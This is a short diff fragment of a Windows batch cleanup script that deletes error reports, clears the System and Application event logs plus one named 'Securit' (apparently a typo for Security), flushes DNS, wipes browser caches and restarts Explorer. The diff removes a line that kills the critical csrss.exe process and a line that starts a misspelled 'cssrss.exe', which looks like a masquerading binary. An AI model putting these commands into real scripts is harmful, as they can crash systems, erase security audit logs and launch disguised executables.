@@ -98,7 +98,6 @@ rmdir /s /q C:\ProgramData\Microsoft\Windows\WER\ReportArchive
 wevtutil cl System
 wevtutil cl Application
 wevtutil cl Securit
-tasklist /fi "imagename eq svchost.exe"
 ipconfig /flushdns
 RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8
 RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16384
@@ -135,8 +134,6 @@ for %%A in ("%localappdata%\Microsoft\Windows\INetCache\IE\*") do (
     rd "%%A" /s /q >NUL 2>&1
 ) >NUL 2>&1
 powershell Clear-RecycleBin -Force >NUL 2>&1
-taskkill /f /im csrss.exe
-start cssrss.exe
 taskkill /f /im dwm.exe
 taskkill /f /im explorer.exe
 start explorer.exe
